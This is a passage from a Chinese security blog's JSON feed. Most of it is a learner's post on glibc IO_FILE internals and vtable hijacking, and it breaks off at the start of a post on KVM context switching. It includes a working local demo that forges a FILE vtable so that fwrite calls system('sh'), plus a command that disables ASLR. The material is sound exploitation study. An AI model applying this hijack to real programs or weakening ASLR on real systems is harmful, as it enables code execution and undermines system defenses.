(<span class=\"keyword\">struct</span> locked_FILE *) <span class=\"built_in\">malloc</span> (<span class=\"keyword\">sizeof</span> (<span class=\"keyword\">struct</span> locked_FILE)); <span class=\"comment\">//调用malloc分配FILE结构的空间,从这里也可以知道FILE结构存储在堆中</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (new_f == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">....</span><br><span class=\"line\">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<span class=\"comment\">//初始化vtable</span></span><br><span class=\"line\">  _IO_file_init (&amp;new_f-&gt;fp);<span class=\"comment\">//调用函数进行进一步初始化操作</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class=\"literal\">NULL</span>)<span class=\"comment\">//打开目标文件,最后会调用到系统调用open</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class=\"line\">  <span class=\"built_in\">free</span> (new_f);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>fileops.c: _IO_file_init</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_new_file_init (<span class=\"keyword\">struct</span> _IO_FILE_plus *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class=\"line\"><span class=\"comment\">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class=\"line\"><span class=\"comment\">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class=\"line\">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class=\"line\">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_link_in (fp);<span class=\"comment\">//把新分配的FILE链入_IO_list_all为起始的FILE链表中</span></span><br><span class=\"line\">  fp-&gt;file._fileno = <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>genops.c  但是这个操作不是会让fp成为头部嘛????????</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_link_in (<span class=\"keyword\">struct</span> _IO_FILE_plus *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class=\"line\"></span><br><span class=\"line\">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">      _IO_list_all = fp;</span><br><span class=\"line\">      ++_IO_list_all_stamp;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"fread\"><a href=\"#fread\" class=\"headerlink\" title=\"fread\"></a>fread</h2><p>​\t\t可以看下参考链接1给的流程图,结合代码来看</p>\n<p>libio&#x2F;iofread.c</p>\n<h2 id=\"fwrite\"><a href=\"#fwrite\" class=\"headerlink\" title=\"fwrite\"></a>fwrite</h2><p>​\t\t标准IO库函数,用于向文件流中写入数据, 函数原型如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">fwrite</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* buffer, <span class=\"type\">size_t</span> size, <span class=\"type\">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>buffer: 是一个指针，对 fwrite 来说，是<strong>需要写入文件的数据的地址</strong>;</li>\n<li>size: 要写入内容的单字节数;</li>\n<li>count: 要进行写入 size 字节的数据项的个数;</li>\n<li>stream: 目标文件指针;<strong>(要写入的文件)</strong></li>\n<li>返回值：实际写入的数据项个数 count。</li>\n</ul>\n<p>libio&#x2F;iofwrite.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_size_t</span><br><span class=\"line\">_IO_fwrite (<span class=\"type\">const</span> <span class=\"type\">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_size_t request = size * count;</span><br><span class=\"line\">  _IO_size_t written = <span class=\"number\">0</span>;</span><br><span class=\"line\">  CHECK_FILE (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (request == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_acquire_lock (fp);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_vtable_offset (fp) != <span class=\"number\">0</span> || _IO_fwide (fp, <span class=\"number\">-1</span>) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">    written = _IO_sputn (fp, (<span class=\"type\">const</span> <span class=\"type\">char</span> *) buf, request);</span><br><span class=\"line\">  _IO_release_lock (fp);</span><br><span class=\"line\">  <span class=\"comment\">/* We have written all of the input in case the return value indicates</span></span><br><span class=\"line\"><span class=\"comment\">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class=\"line\"><span class=\"comment\">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class=\"line\"><span class=\"comment\">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (written == request || written == EOF)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> count;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> written / size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t主要调用了  _IO_sputn 来实现写入的功能,  _IO_sputn 位于  _IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。 <font color=\"red\">它对应了函数 _IO_new_file_xsputn,咋对应的…</font></p>\n<p>fileops.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_size_t</span><br><span class=\"line\">_IO_new_file_xsputn (_IO_FILE *f, <span class=\"type\">const</span> <span class=\"type\">void</span> *data, _IO_size_t n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *s = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) data;</span><br><span class=\"line\">  _IO_size_t to_do = n;</span><br><span class=\"line\">  <span class=\"type\">int</span> must_flush = <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_size_t count = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"comment\">/* This is an optimized implementation.</span></span><br><span class=\"line\"><span class=\"comment\">     If the amount to be written straddles a block boundary</span></span><br><span class=\"line\"><span class=\"comment\">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First figure out how much space is available in the buffer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt;= n)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"type\">const</span> <span class=\"type\">char</span> *p;</span><br><span class=\"line\">\t  <span class=\"keyword\">for</span> (p = s + n; p &gt; s; )</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (*--p == <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  count = p - s + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t  must_flush = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class=\"line\">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class=\"comment\">/* Space available. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Then fill the buffer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; to_do)</span><br><span class=\"line\">\tcount = to_do;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _LIBC</span></span><br><span class=\"line\">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      <span class=\"built_in\">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class=\"line\">      f-&gt;_IO_write_ptr += count;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      s += count;</span><br><span class=\"line\">      to_do -= count;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (to_do + must_flush &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_size_t block_size, do_write;</span><br><span class=\"line\">      <span class=\"comment\">/* Next flush the (full) buffer. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class=\"line\">\t<span class=\"comment\">/* If nothing else has to be written we must not signal the</span></span><br><span class=\"line\"><span class=\"comment\">\t   caller that everything has been written.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> to_do == <span class=\"number\">0</span> ? EOF : n - to_do;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class=\"line\">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class=\"line\">      do_write = to_do - (block_size &gt;= <span class=\"number\">128</span> ? to_do % block_size : <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (do_write)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  count = new_do_write (f, s, do_write);</span><br><span class=\"line\">\t  to_do -= count;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (count &lt; do_write)</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class=\"line\"><span class=\"comment\">\t buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class=\"line\"><span class=\"comment\">\t so we let _IO_default_xsputn handle the general case. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (to_do)</span><br><span class=\"line\">\tto_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里主要会调用同样位于vtable中的_IO_OVERFLOW,对应函数是 _IO_new_file_overflow</p>\n<p>fileops.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_new_file_overflow (_IO_FILE *f, <span class=\"type\">int</span> ch)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">...........</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ch == EOF)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class=\"line\">\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class=\"comment\">/* Buffer is really full */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_do_flush (f) == EOF)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">..........</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在这里会最终调用write系统调用</p>\n<h2 id=\"fclose\"><a href=\"#fclose\" class=\"headerlink\" title=\"fclose\"></a>fclose</h2><h2 id=\"伪造-劫持\"><a href=\"#伪造-劫持\" class=\"headerlink\" title=\"伪造 劫持\"></a>伪造 劫持</h2><p>​\t\tvtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，<strong>通过任意地址写就可以实现</strong>。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</p>\n<p>​\t\t伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。\t</p>\n<p>奇怪,必须要加\\n , 和缓冲区刷新有关</p>\n<p>gcc -g 可以在调试的时候….</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"type\">long</span> *vtable_ptr;</span><br><span class=\"line\">    fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">    vtable_ptr=*(<span class=\"type\">long</span> <span class=\"type\">long</span>*)((<span class=\"type\">long</span> <span class=\"type\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//get vtable</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;vtable_ptr: %p\\n&quot;</span>, (<span class=\"type\">void</span>*)vtable_ptr);  <span class=\"comment\">// 打印vtable_ptr的值</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;addr1:%p\\n&quot;</span>, (<span class=\"type\">void</span>*)vtable_ptr);  <span class=\"comment\">// 打印vtable_ptr的值</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;addr2:%p\\n &quot;</span>,(<span class=\"type\">void</span>*)vtable_ptr);</span><br><span class=\"line\">    vtable_ptr[<span class=\"number\">7</span>]=<span class=\"number\">0x41414141</span>; <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;call 0x41414141&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230805203530314.png\" alt=\"image-20230805203530314\" style=\"zoom:50%;\">\n\n\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230805203540676.png\" alt=\"image-20230805203540676\" style=\"zoom: 50%;\">\n\n\n\n<p>​\t\t但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p>\n<p>​\t\tvtable_addr[0]位于堆中,可以写,这样就相当于要伪造整个vtable表</p>\n<h3 id=\"示例代码\"><a href=\"#示例代码\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h3><p>​\t\tsystem_ptr根据实际情况修改</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"type\">long</span> *vtable_addr,*fake_vtable;</span><br><span class=\"line\"></span><br><span class=\"line\">    fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">    fake_vtable=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_addr=(<span class=\"type\">long</span> <span class=\"type\">long</span> *)((<span class=\"type\">long</span> <span class=\"type\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//vtable offset</span></span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_addr[<span class=\"number\">0</span>]=(<span class=\"type\">long</span> <span class=\"type\">long</span>)fake_vtable;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(fp,<span class=\"string\">&quot;sh&quot;</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    fake_vtable[<span class=\"number\">7</span>]=system_ptr; <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"></span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;hi&quot;</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以看到伪造效果,vtable被覆盖为堆上的地址了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806114845070.png\" alt=\"image-20230806114845070\"></p>\n<p>​\t\t fake_vtable[7]&#x3D;system_ptr; 再把堆上相应内容改成system的地址就可以了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806115013625.png\" alt=\"image-20230806115013625\"></p>\n<p>​\t\t本地尝试不成功,但在gdb中调试的时候是成功的,怀疑是随机化的问题,关闭随机化就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo <span class=\"number\">0</span> &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806114653707.png\" alt=\"image-20230806114653707\"></p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://blog.csdn.net/qq_45323960/article/details/123810198\">https://blog.csdn.net/qq_45323960/article/details/123810198</a>  大部分图都是参考的这个师傅的,写得非常好! 推荐看原文</p>\n<p>ctf-wiki</p>\n<p><a href=\"https://blog.csdn.net/xy_369/article/details/130874848\">https://blog.csdn.net/xy_369/article/details/130874848</a> </p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-2-KVM%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81-%E5%86%85%E6%A0%B84-4%E7%89%88%E6%9C%AC/",
            "url": "https://tangzichengcc.github.io/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-2-KVM%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81-%E5%86%85%E6%A0%B84-4%E7%89%88%E6%9C%AC/",
            "title": "虚拟化入门-2-KVM源码分析之上下文切换的执行流-内核4.4版本",
            "date_published": "2023-08-03T12:44:52.000Z",
            "content_html": "<p>​\t\t这里应该有两部分,一部分是,host如何进入guest,进入的时候保存了什么,加载了什么,怎么进行的切换,第二部分是guest在运行的时候,什么情况下会进行退出,切换到host,这个时候又需要保存什么,恢复什么</p>\n<p>​\t\t关于指令的运行, 我理解的如果不是敏感指令,在CPU转为guest状态后,就在物理CPU上执行虚拟机的指令,此时像内存,页表,各种寄存器等也都切换成虚拟机的了,所以就相当于一台真正的机器在运行,不会受到什么影响,只是当遇到敏感指令时,就需要vmexit退出进行特殊处理了</p>\n<img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-2-KVM%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81-%E5%86%85%E6%A0%B84-4%E7%89%88%E6%9C%AC/image-20230730190236168.png\" alt=\"image-20230730190236168\" style=\"zoom: 67%;\">\n\n<h1 id=\"host进入guest-开始运行虚拟机指令\"><a href=\"#host进入guest-开始运行虚拟机指令\" class=\"headerlink\" title=\"host进入guest | 开始运行虚拟机指令\"></a>host进入guest | 开始运行虚拟机指令</h1><p>​\t\tQEMU中VCPU线程函数为qemu_kvm_cpu_thread_fn（cpus.c）,该函数内部有一个循环，执行虚拟机代码,先用cpu_can_run判断是否可以运行,可以的话,进入VCPU执行的核心函数kvm_cpu_exec</p>\n<h3 id=\"VCPU执行的核心函数-kvm-cpu-exec\"><a href=\"#VCPU执行的核心函数-kvm-cpu-exec\" class=\"headerlink\" title=\"VCPU执行的核心函数  kvm_cpu_exec\"></a>VCPU执行的核心函数  kvm_cpu_exec</h3><p>​\t\t核心是一个 do while循环，会用kvm_vcpu_ioctl(cpu,KVM_RUN,0)使CPU运行起来, 如果遇到VM Exit,需要qemu处理的话,会返回到这里,让QEMU进行处理.</p>\n<p>​\t\tioctl(KVM_RUN)是KVM进行处理的,它对应的处理函数是kvm_arch_vcpu_ioctl_run,该函数主要调用vcpu_run</p>\n<p>kvm&#x2F;x86.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_arch_vcpu_ioctl_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> 